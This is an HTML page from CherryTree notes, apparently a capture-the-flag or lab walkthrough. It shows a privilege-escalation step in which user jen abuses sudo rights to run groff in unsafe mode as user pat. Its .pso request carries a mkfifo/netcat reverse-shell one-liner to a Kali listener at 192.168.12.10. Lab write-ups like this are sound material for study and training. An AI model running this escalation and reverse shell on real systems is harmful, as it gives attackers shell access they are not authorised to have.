<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5. Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5. Privilege Escalation</h1><br/><br />1. Sudo priveleges of user “jen”.<br />    <div class="codebox"><div class="codebox">jen@murph<span style="color:#a52a2a;font-weight:700">:/</span>home<span style="color:#a52a2a;font-weight:700">/</span>jen$&nbsp;<span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;-l<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/928-1.png" alt="images/928-1.png" /><br /><br />2. “Groff” tool.<br />    <br />    “groff” is a tool for creating man pages and it allows you to do it inside an interactive(ish) shell.<br />    You can find some useful “groff” info <a href="https://www.gnu.org/software/groff/manual/html_node/I_002fO.html">here</a>.<br /><br />    <table class="table"><col/><col/><tr><th></th><th></th></tr><tr><td>Command</td><td>What is it?</td></tr><tr><td>.pso</td><td>Read the standard output from the specified command </td></tr><tr><td>.open</td><td>Open the specified file for writing</td></tr><tr><td>.opena</td><td>The opena request is like open, but if the file exists, append to it instead of truncating it.
</td></tr><tr><td>.sy</td><td>Execute the shell command(s) specified by cmds.</td></tr><tr><td>.pi</td><td>Pipe the output of gtroff to the shell command(s) specified by pipe</td></tr></table><br /><br />    Use “groff” in unsafe mode and use it to connect via “Reverse Shell” to another “nc” listener.<br /><br />3. On your Kali Machine create another “nc” listener.<br />    <div class="codebox"><div class="codebox">$&nbsp;nc&nbsp;-vlnp&nbsp;1235<br /></div></div><br /><br />4. On the victim's run “groff” in “unsafe” mode.<br />    <div class="codebox"><div class="codebox">jen@murph<span style="color:#a52a2a;font-weight:700">:/</span>home<span style="color:#a52a2a;font-weight:700">/</span>jen$&nbsp;<span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;-u&nbsp;pat&nbsp;groff&nbsp;-U&nbsp;&nbsp;<br />jen@murph<span style="color:#a52a2a;font-weight:700">:/</span>home<span style="color:#a52a2a;font-weight:700">/</span>jen$&nbsp;.pso&nbsp;<span style="color:#a52a2a;font-weight:700">rm</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>f<span style="color:#a52a2a;font-weight:700">;mkfifo</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>f<span style="color:#a52a2a;font-weight:700">;cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>f<span style="color:#a52a2a;font-weight:700">|sh</span>&nbsp;-i&nbsp;<span style="color:#a52a2a;font-weight:700">2&gt;&amp;</span>1<span style="color:#a52a2a;font-weight:700">|</span>nc&nbsp;192.168.12.10&nbsp;1235&nbsp;&gt;<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>f</div></div><br /><br />    <span style="color:#ffa500;">Output:</span>    <br />    <img src="images/928-2.png" alt="images/928-2.png" /><br /><br />5. Look whether you are the user “pat” or not.<br />    <div class="codebox"><div class="codebox">$&nbsp;<span style="color:#a52a2a;font-weight:700">id</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/928-3.png" alt="images/928-3.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>